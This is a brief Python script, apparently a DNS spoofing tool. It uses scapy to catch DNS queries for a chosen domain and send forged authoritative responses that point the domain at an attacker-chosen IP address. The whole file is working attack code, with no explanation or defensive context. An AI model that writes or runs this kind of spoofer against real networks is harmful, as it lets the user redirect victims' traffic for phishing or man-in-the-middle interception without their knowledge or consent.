from scapy.all import *

FAKE_DOMAIN = "example.com"
FAKE_IP = "192.168.1.99"


def dns_spoof(pkt):
    if pkt.haslayer(DNSQR) and FAKE_DOMAIN in pkt[DNSQR].qname.decode():
        spoofed_pkt = (IP(dst=pkt[IP].src, src=pkt[IP].dst)/
                       UDP(dport=pkt[UDP].sport, sport=53)/
                       DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                           an=DNSRR(rrname=pkt[DNSQR].qname, rdata=FAKE_IP)))
        send(spoofed_pkt, verbose=0)
        print(f"[!] Spoofed DNS response sent for {FAKE_DOMAIN}")
